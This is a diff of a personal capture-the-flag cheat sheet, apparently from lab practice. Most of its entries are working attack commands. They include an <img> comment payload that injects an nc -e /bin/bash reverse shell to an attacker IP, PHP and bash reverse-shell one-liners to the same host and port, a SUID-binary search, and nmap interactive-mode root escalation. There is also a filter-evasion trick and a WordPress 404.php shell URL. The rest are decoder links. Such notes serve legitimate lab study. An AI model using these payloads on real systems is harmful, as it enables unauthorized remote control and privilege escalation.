@@ -14,61 +14,67 @@ To check if there is a nse script for X service:
 
 *
 Getting rev shell when there is a chance to write a comment
-<img src=http://10.6.46.150/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.6.46.150 '$IFS'4444')>
+`<img src=http://10.6.46.150/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.6.46.150 '$IFS'4444')>`
 
  
+*
+SPAWNING INTTERACTING SHELL WITH PYTHON
+`python3 -c 'import pty;pty.spawn("/bin/bash")'`   
 
-#### SPAWNING INTTERACTING SHELL WITH PYTHON
-python3 -c 'import pty;pty.spawn("/bin/bash")'   
+*
+Listing all binaries with suid permission
+`find / -perm -u=s -type f 2>/dev/null`
 
+*
+link to access a modified WP theme - `404.php` (to get rev shell)
+`http://10.10.142.159/wp-content/themes/twentyfifteen/404.php`
 
-#### GETTING A LIST OF SUID FILES
-find / -perm -u=s -type f 2>/dev/null
----> finds all binaries with suuid permission
+*
+if there is a filtering, it is needed to add command in backslashes e.g `l\s -la`
 
-#### link to access a modified WP theme (to get rev shell)
-http://10.10.142.159/wp-content/themes/twentyfifteen/404.php 
+*
+PHP REV SHELL ONE LINER
+`php -r '$sock=fsockopen("10.6.46.150",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
+*
+BASH REV SHELL ONELINER
+`bash -i &>/dev/tcp/10.6.46.150/4444 <&1`
 
-# if there is a filtering, it is needed to add command in backslashes e.g `l\s -la`
+*
+There are many different converters to john format
+`bin2john / zip2john / gpg2john`
 
-
-# PHP REV SHELL ONE LINER
-php -r '$sock=fsockopen("10.6.46.150",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
-
-# BASH REV SHELL ONELINER
-bash -i &>/dev/tcp/10.6.46.150/4444 <&1
-
-
-# There are many different converters to john format
-bin2john / zip2john / gpg2john 
-
-#
+*
 7z is a file to extract
 
-#
+*
 binwalk -->> tool to check of there is a zip file inside .png image
 `binwalk -e file`
 
-# NMAP SHELL
-old version of nmap can be used to escalate to root
-nmap --versiob
-nmap --interactive
-and then `!sh`
+*
+NMAP SHELL
+Old version of nmap can be used to escalate to root
+`nmap --version` to check version
+`nmap --interactive` to enter interacttive mode
+and then `!sh` to get root
 
-#
+*
 BRAINFUCK decoder
-
-https://www.splitbrain.org/_static/ook/
+`https://www.splitbrain.org/_static/ook/`
 
 ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++++++.------------.+++++.>+++++++++++++++++++++++.<<++++++++++++++++++.>>-------------------.---------.++++++++++++++.++++++++++++.<++++++++++++++++++.+++++++++.<+++.+.>----.>++++.
 
-#
+*
 XOR DECODER
+`http://xor.pw/#`
 
-http://xor.pw/#
-
-#
+*
 SPEECH TO TEXT CONVERTER
 
-https://speech-to-text-demo.ng.bluemix.net/
+`https://speech-to-text-demo.ng.bluemix.net/`
+
+
+
+
+
+
